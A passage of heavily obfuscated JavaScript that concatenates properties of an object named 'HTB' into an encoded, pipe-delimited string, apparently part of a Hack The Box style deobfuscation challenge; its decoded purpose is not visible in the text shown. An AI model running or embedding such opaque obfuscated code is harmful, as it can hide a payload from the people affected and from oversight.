HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$__+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$__+HTB.$__+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.$$__+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_$+HTB._$$+"|"+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.__$+HTB.__+"|"+HTB.$_$_+HTB.$_$$+HTB.$$__+HTB.$$_$+HTB.$$$_+HTB.$$$$+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.___+HTB.$$_+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$$+HTB.___+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$$+HTB._$_+HTB.___+HTB.__$+HTB._$_+HTB._$$+HTB.$__+HTB.$_$+HTB.$$_+HTB.$$$+HTB.$___+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$__$+HTB.$_$$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+HTB._$_+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+HTB._$$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB._$$+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+HTB._$$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+HTB.__$+HTB.$_$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$__+HTB.$$$+"|\\"+HTB.__$+HTB.$__+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$$+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$$$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB.$$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+HTB._+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"\\"+HTB.__$+HTB.___+HTB._$$+"|\\"+HTB.__$+HTB.$$_+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$__+HTB.__+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|"+HTB.$$__+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB._$$+"|"+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"|\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB.$$$+"|\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB._$$+HTB.___+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$___+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB._$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$__+"|"+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+HTB.$___+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB._$_+HTB.$_$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.___+"|"+HTB._$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$__+HTB.$_$_+"|\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB._$$+HTB._$_+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB._+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|"+HTB._$+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB._$$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$___+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB._$$+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+HTB.$___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"|"+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+HTB.$_$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"|\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB._$+HTB.$$$$+HTB.$$_$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$$+HTB.$$_+"|"+HTB.__+HTB.$$_$+(![]+"")[HTB._$_]+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.___+HTB.$_$_+"|"+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB.__$+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$$+HTB.$$__+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB._$$+HTB.___+"|"+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+"\\"+HTB.__$+HTB._$_+HTB.___+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$_$$+"\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$__+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+(![]+"")[HTB._$_]+"|"+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.___+"|\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$__+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB._+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|\\"+HTB.__$+HTB.___+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$$$_+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.__$+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$__$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.___+HTB.$$$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB._$$+HTB.___+HTB._$_+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB._$$+HTB.___+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$__$+HTB.$_$+HTB.$_$$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB._$$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_$+HTB.$__$+"|\\"+HTB.__$+HTB.$_$+HTB.___+HTB.__+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|"+HTB.$$_$+HTB.$$$_+HTB.__$+HTB.$$$$+HTB.$_$$+HTB.$_$+HTB.$$_+HTB.__$+HTB._$$+HTB._$$+HTB.$___+HTB.$$$$+HTB.$$$_+HTB.___+HTB.$$$$+HTB.$_$_+HTB.$$$+HTB.$$_$+HTB.__$+HTB.$_$$+HTB.$$$+HTB.$$$_+HTB.__$+HTB._$$+HTB.$$$$+HTB.$$$$+HTB.$__+HTB._$_+HTB.__$+HTB.$__$+HTB.$$$$+HTB.$$_+"|"+HTB.$_$_+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"|"+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.$$$_+"|"+HTB.$$__+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+"|\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$__+"|\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.__$+HTB.$$__+HTB.$_$$+HTB.$_$_+"|"+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$$_+HTB.$$$$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$$$$+"\\"+HTB.__$+HTB.___+HTB.$$$+"|"+HTB.$_$_+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$_$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$$+"|\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$___+HTB._$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$__+HTB.$_$$+"\\"+HTB.__$+HTB.__$+HTB._$$+"|"+HTB.$$__+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB._$$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$_+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB.$$$_+"\\"+HTB.__$+HTB.__$+HTB.$$_+HTB.$__$+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$___+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB.$$$+"|\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$___+HTB.$_$_+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+HTB.$_$$+HTB._$$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$$$+"|\\"+HTB.__$+HTB.$$$+HTB.__$+HTB.$___+HTB._$+HTB.__+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.__$+HTB.$___+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB.___+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+(![]+"")[HTB._$_]+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.$__+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB._$$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.___+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+HTB.$$$+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB.$$$$+"\\"+HTB.__$+HTB.$$_+HTB._$$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$_+HTB.$$$+HTB.$___+"|\\"+HTB.__$+HTB.$_$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+HTB.___+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+HTB._$$+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+HTB.$$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$$+HTB._$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|"+HTB.$$__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.$__+HTB.$$_+HTB._$+HTB.$$$_+HTB.$$$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$__+HTB.$_$_+"|"+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+HTB.$__+"|"+HTB.$_$_+"\\"+HTB.__$+HTB.__$+HTB._$_+"|"+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|"+HTB.$$_$+HTB.$_$_+HTB.__+HTB.$_$_+"|\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$$$_+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$$_+HTB._$+HTB._+HTB.__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB._$_+HTB.$_$$+HTB.$$__+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$$+HTB.__+"|\\"+HTB.__$+HTB._$_